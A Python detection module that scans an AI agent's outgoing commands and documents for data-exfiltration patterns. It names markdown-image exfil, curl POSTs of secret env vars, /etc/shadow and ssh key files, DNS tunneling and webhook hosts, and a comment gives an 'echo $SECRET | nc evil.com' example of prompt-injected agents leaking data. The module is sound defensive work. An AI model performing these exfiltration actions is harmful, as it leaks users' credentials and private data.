"""Family 8: Exfiltration primitives in outbound agent content.

Runs on the OUTPUT side — the agent's own actions, not its inputs.
Detects when a Bash command, Write content, or markdown document is
constructing an exfiltration vector: markdown-image exfil, webhook POSTs,
DNS tunneling, data: URL exfil, suspicious curl POSTs, etc.

This catches the "injection succeeded, agent is now doing damage" case.
Input-side injection detection (Families 1-9, 12) is the preventive
layer; exfil detection is the confirmatory layer when prevention fails.

All patterns are HIGH or CRITICAL severity — false-positive risk is LOW
because these patterns are distinctive of deliberate exfil attempts.
"""

from __future__ import annotations

import re

from ralf.injection import Family, InjectionHit, Severity


# Known exfil-via-HTTP-POST destinations. Any POST to these is a
# confirmed exfiltration channel. Expand as you encounter new ones.
_EXFIL_HOSTS = [
    r"webhook\.site",
    r"(?:[a-z0-9-]+\.)?requestbin\.com",
    r"(?:[a-z0-9-]+\.)?pipedream\.com",
    r"(?:[a-z0-9-]+\.)?ngrok\.io",
    r"ngrok-free\.app",
    r"burpcollaborator\.(?:net|com)",
    r"oast\.site",
    r"interact\.sh",
    r"discord\.com/api/webhooks",
    r"hooks\.slack\.com",
    # Additional exfil hosts available in extended edition.
]

# Build the hosts alternation as a non-capturing group.
_EXFIL_HOST_RE = r"(?:" + "|".join(_EXFIL_HOSTS) + r")"


_EXFIL_PATTERNS: list[tuple[str, "re.Pattern[str]", Severity, int, str]] = [
    # Markdown image with query-string data parameter to external host.
    # Core vector for EchoLeak / Copilot / Bing-era zero-click exfil.
    # Excludes internal / localhost destinations via negative lookahead.
    (
        "pi-exfil-md-image",
        re.compile(
            r"!\[[^\]]*\]\("
            r"(?:https?:)?//"
            r"(?!(?:localhost|127\.0\.0\.1|[a-z0-9.\-]+\.(?:internal|corp|local|trusted)))"
            r"[^\s)]+"
            r"(?:\?|#|/)"
            r"[^)]*"
            r"(?:data|q|token|secret|prompt|context|payload|c|x|b|leak|msg)=[^)]+"
            r"\)",
            re.IGNORECASE,
        ),
        Severity.CRITICAL, 12, "markdown image exfil with data query param",
    ),
    # Markdown link whose URL carries JWT / API key / bearer-ish query value.
    (
        "pi-exfil-md-link",
        re.compile(
            r"\[[^\]]*\]\("
            r"(?:https?:)?//[^\s)]+"
            r"(?:\?|#|/)"
            r"[^)]*"
            r"(?:eyJ[A-Za-z0-9_\-]{10,}|secret|api[_-]?key|token|password|bearer|cookie)"
            r"[^)]*\)",
            re.IGNORECASE,
        ),
        Severity.CRITICAL, 12, "markdown link exfil with credential-like query",
    ),
    # HTML img src with query params referencing secrets/data.
    (
        "pi-exfil-img-tag",
        re.compile(
            r"<img\s[^>]*src\s*=\s*[\"']"
            r"(?:https?:)?//"
            r"[^\"']+"
            r"\?[^\"']*"
            r"(?:data|token|prompt|secret|payload|leak)=",
            re.IGNORECASE,
        ),
        Severity.CRITICAL, 12, "HTML img exfil",
    ),
    # data:text|image URL with long base64 payload — classic exfil-as-download.
    (
        "pi-exfil-data-url",
        re.compile(
            r"data:(?:image|text|application)/[^;]+;base64,[A-Za-z0-9+/=]{200,}",
            re.IGNORECASE,
        ),
        Severity.HIGH, 8, "data: URL with long base64 payload",
    ),
    # Known webhook-as-a-service destinations anywhere in content.
    (
        "pi-exfil-webhook-host",
        re.compile(
            r"https?://" + _EXFIL_HOST_RE,
            re.IGNORECASE,
        ),
        Severity.HIGH, 10, "known webhook/paste exfil host",
    ),
    # curl POSTing a secret env var value.
    (
        "pi-exfil-curl-post-secret",
        re.compile(
            r"\b(?:curl|wget|http(?:ie)?|fetch)\b[^\n]*"
            r"(?:-X\s*POST|-d\b|--data(?:-raw|-binary|-urlencode)?[\s=]|--form\b|-F\b|-T\b|--upload-file\b|POST\s+)"
            r"[^\n]*"
            r"\$(?:SECRET|TOKEN|API_KEY|APIKEY|PASSWORD|PRIVATE|AWS_|ANTHROPIC_|OPENAI_|GITHUB_|GITLAB_|SLACK_)"
            r"[A-Z_]*",
            re.IGNORECASE | re.DOTALL,
        ),
        Severity.CRITICAL, 12, "curl POST with secret env var",
    ),
    # curl POST carrying a file path to /etc/passwd, /etc/shadow, ssh keys.
    (
        "pi-exfil-curl-post-sensitive-file",
        re.compile(
            r"\b(?:curl|wget|http(?:ie)?|fetch)\b[^\n]*"
            r"(?:-d\b|--data(?:-raw|-binary)?[\s=]|-T\b|--upload-file\b|-F\b)"
            r"[^\n]*"
            r"(?:/etc/(?:shadow|sudoers|passwd)"
            r"|~/\.ssh/(?:id_rsa|id_ed25519|id_ecdsa|authorized_keys)"
            r"|\.aws/credentials|\.kube/config)",
            re.IGNORECASE | re.DOTALL,
        ),
        Severity.CRITICAL, 12, "curl POST with sensitive file",
    ),
    # DNS exfiltration via hex-encoded hostname (common tunneling pattern).
    (
        "pi-exfil-dns-tunnel",
        re.compile(
            r"\b(?:dig|nslookup|host|curl|wget)\b[^\n]*"
            r"\b[a-f0-9]{32,}\.(?:[a-z0-9-]+\.)+[a-z]{2,}\b",
            re.IGNORECASE,
        ),
        Severity.HIGH, 10, "DNS tunneling hostname",
    ),
    # Arbitrary bash to network: `echo $SECRET | nc evil.com 9999`
    (
        "pi-exfil-nc-bash",
        re.compile(
            r"(?:echo|printf|cat)\b[^|]{0,200}\$"
            r"(?:SECRET|TOKEN|API_KEY|PASSWORD|PRIVATE|AWS_|ANTHROPIC_|OPENAI_)"
            r"[A-Z_]*"
            r"[^|]{0,200}\|\s*(?:nc|ncat|socat|netcat|curl|wget)\b",
            re.IGNORECASE | re.DOTALL,
        ),
        Severity.CRITICAL, 12, "pipe-to-network with secret env var",
    ),
    # Base64 + curl POST combo (encode secret then exfil).
    (
        "pi-exfil-base64-curl",
        re.compile(
            r"base64\b[^\n]{0,200}\|\s*(?:curl|wget|nc|ncat|socat)\b[^\n]*"
            r"(?:-d\b|-X\s*POST|--data)",
            re.IGNORECASE | re.DOTALL,
        ),
        Severity.HIGH, 10, "base64-encoded payload piped to network",
    ),
]


def scan_for_exfil(content: str) -> list[InjectionHit]:
    """Scan text for exfiltration primitives. Returns list of hits."""
    hits: list[InjectionHit] = []
    if not content:
        return hits
    for pid, pat, sev, score, ev in _EXFIL_PATTERNS:
        m = pat.search(content)
        if m is None:
            continue
        hits.append(InjectionHit(
            pattern_id=pid,
            family=Family.EXFIL_PRIMITIVE,
            severity=sev,
            score=score,
            match_text=m.group(0)[:200],
            evidence=ev,
        ))
    return hits


def exfil_score(hits: list[InjectionHit]) -> int:
    """Aggregate exfil score — max hit (these don't dampen; CRITICAL is decisive)."""
    if not hits:
        return 0
    return max(h.score for h in hits)


def exfil_reason(hits: list[InjectionHit]) -> str:
    """Short summary for the verdict reason."""
    if not hits:
        return ""
    top = max(hits, key=lambda h: h.score)
    return f"exfil: {top.evidence}"
